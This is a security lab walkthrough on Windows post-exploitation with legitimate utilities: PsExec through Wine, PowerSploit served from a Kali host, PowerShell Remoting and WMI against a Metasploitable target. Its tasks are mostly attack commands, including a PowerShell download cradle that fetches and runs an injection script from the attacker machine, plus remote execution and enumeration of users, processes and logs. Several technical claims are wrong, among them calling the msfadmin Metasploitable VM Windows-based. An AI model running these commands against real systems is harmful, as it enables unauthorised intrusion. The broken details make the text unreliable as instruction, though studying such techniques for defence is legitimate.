# Lab 2: Post-Exploitation using Legitimate Utilities and Living-off-the-Land

**Objective:**
This lab focuses on performing post-exploitation tasks on a Windows-based victim machine (Metasploitable) using legitimate utilities like **PsExec**, **PowerShell**, and **PowerSploit**. The goal is to use these tools to gain further access, execute commands, and gather information from the compromised system, all without deploying additional malicious files.

**Attacker Machine: Kali Linux (Example IP: `192.168.78.147`)**  
**Victim Machine: Metasploitable (Example IP: `192.168.78.6`)**

---

### **Overview of Tools:**

- **PsExec**: A Sysinternals tool for executing processes on remote Windows systems.
- **PowerShell**: A scripting language used to automate tasks, useful for performing post-exploitation tasks.
- **PowerSploit**: A collection of PowerShell scripts that can be used for exploitation, exfiltration, and persistence.
- **PowerShell Remoting**: A feature in Windows that allows remote execution of PowerShell commands.
- **Sysinternals Suite**: A collection of powerful utilities for system administration, useful in post-exploitation.

---

### **Task 1: Install PsExec on Kali Linux and Use It to Control the Victim Machine**

#### **1.1 Install PsExec on Kali Linux:**

1. **Download Sysinternals Suite**:
   Open a terminal on Kali and download the Sysinternals Suite:
   ```bash
   wget https://download.sysinternals.com/files/SysinternalsSuite.zip
   ```

2. **Extract the Suite**:
   Extract the downloaded zip file:
   ```bash
   unzip SysinternalsSuite.zip
   ```

3. **Install Wine (for running Windows executables on Linux)**:
   PsExec is a Windows executable, so install Wine to run it:
   ```bash
   sudo apt update
   sudo apt install wine
   ```

4. **Run PsExec Using Wine**:
   Navigate to the extracted Sysinternals folder and run PsExec with Wine:
   ```bash
   wine PsExec.exe \\192.168.78.6 -u msfadmin -p msfadmin cmd.exe
   ```

#### **1.2 Use PsExec to Execute Remote Commands on Metasploitable:**

1. **List Running Processes**:
   After connecting to the victim machine via PsExec, list the running processes to gather information:
   ```bash
   wine PsExec.exe \\192.168.78.6 -u msfadmin -p msfadmin tasklist
   ```

2. **Execute Additional Commands**:
   Try running more commands on the victim system, such as launching `calc.exe` to demonstrate interaction with the victim's desktop:
   ```bash
   wine PsExec.exe \\192.168.78.6 -u msfadmin -p msfadmin -d -i calc.exe
   ```

---

### **Task 2: Install and Use PowerSploit on Kali Linux**

#### **2.1 Clone PowerSploit Repository:**

1. **Clone PowerSploit**:
   Open a terminal and run the following command to clone the PowerSploit repository:
   ```bash
   git clone https://github.com/PowerShellMafia/PowerSploit.git
   ```

2. **Navigate to PowerSploit Directory**:
   Change to the PowerSploit directory:
   ```bash
   cd PowerSploit
   ```

#### **2.2 Serve PowerSploit Scripts Over HTTP:**

1. **Start an HTTP Server to Expose Scripts**:
   In Kali, you can serve the PowerSploit scripts over HTTP using Python:
   ```bash
   sudo python3 -m http.server 1337
   ```

   This will make the scripts accessible at `http://<Kali_IP>:1337`.

#### **2.3 Download and Execute a PowerSploit Script on Metasploitable:**

1. **Download and Execute the Script**:
   On the victim machine (Metasploitable), open PowerShell and run the following command to download and execute a PowerSploit script (e.g., `Invoke-ReflectivePEInjection.ps1`):
   ```powershell
   IEX (New-Object Net.WebClient).DownloadString('http://192.168.78.147:1337/Invoke-ReflectivePEInjection.ps1')
   ```

   This script will be executed remotely on the victim machine, allowing further post-exploitation actions like data exfiltration.

---

### **Task 3: Using PowerShell Remoting for Further Exploitation**

#### **3.1 Enable PowerShell Remoting on Metasploitable:**

1. **Enable Remoting (if needed)**:
   On Metasploitable, open PowerShell and enable PowerShell remoting:
   ```powershell
   Enable-PSRemoting -SkipNetworkProfileCheck -Force
   ```

   This command will allow PowerShell to accept remote connections.

#### **3.2 Connect to Metasploitable Remotely Using PowerShell Remoting:**

1. **Initiate a Remote PowerShell Session**:
   On Kali, initiate a remote PowerShell session to Metasploitable:
   ```powershell
   Enter-PSSession -ComputerName 192.168.78.6 -Credential (Get-Credential)
   ```

   Provide the username and password (`msfadmin:msfadmin`) when prompted.

2. **Execute Commands Remotely**:
   Once connected, you can execute any PowerShell command remotely on the victim machine. For example:
   - Get a list of installed programs:
     ```powershell
     Get-WmiObject -Class Win32_Product
     ```

---

### **Task 4: Using Sysinternals Tools for Post-Exploitation**

#### **4.1 Using PsExec for Remote Process Execution:**

1. **Launch Calculator on the Victim**:
   You can launch the calculator application on the victim system using PsExec:
   ```bash
   wine PsExec.exe \\192.168.78.6 -u msfadmin -p msfadmin -d -i calc.exe
   ```

#### **4.2 Using Other Sysinternals Tools:**

1. **List Logged-In Users**:
   Use PsLoggedOn to list users logged into the victim system:
   ```bash
   wine PsExec.exe \\192.168.78.6 -u msfadmin -p msfadmin PsLoggedOn
   ```

2. **List Running Processes**:
   Use PsList to display running processes:
   ```bash
   wine PsExec.exe \\192.168.78.6 -u msfadmin -p msfadmin PsList
   ```

3. **Pull Event Logs**:
   Use PsLogList to pull event logs from the victim machine:
   ```bash
   wine PsExec.exe \\192.168.78.6 -u msfadmin -p msfadmin PsLogList
   ```

---

### **Task 5: Using Windows Management Instrumentation (WMI) for Post-Exploitation**

#### **5.1 Use WMI to Gather System Information**:

1. **Enumerate System Information**:
   Use the following PowerShell command to gather information about the victim system:
   ```powershell
   Get-WmiObject -Class Win32_OperatingSystem
   ```

2. **Use WMI to Execute Remote Commands**:
   You can also use WMI to execute commands remotely on the victim machine:
   ```powershell
   Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c echo Hello from Kali"
   ```

---

### **Conclusion:**

This lab demonstrates how attackers can use legitimate tools like **PsExec**, **PowerShell**, and **PowerSploit** to perform post-exploitation activities on a Windows-based system (Metasploitable) from a Kali Linux attacker machine. The tools outlined here enable an attacker to execute remote commands, exfiltrate data, and maintain persistence without installing additional malicious software.

By leveraging **living-off-the-land** techniques, attackers can carry out their activities under the radar, using only built-in tools and scripts that are often overlooked by security software.

---

### **Takeaways:**

- **PsExec** allows remote execution of commands on Windows systems.
- **PowerSploit** offers a set of scripts that enable data exfiltration and further exploitation.
- **PowerShell Remoting** provides a secure way to manage systems remotely and can be used for post-exploitation.
- **Sysinternals tools** like PsExec, PsList, and PsLoggedOn help gather detailed information and execute remote commands on a compromised machine.
- **WMI** allows you to automate administrative tasks and interact with the system remotely.
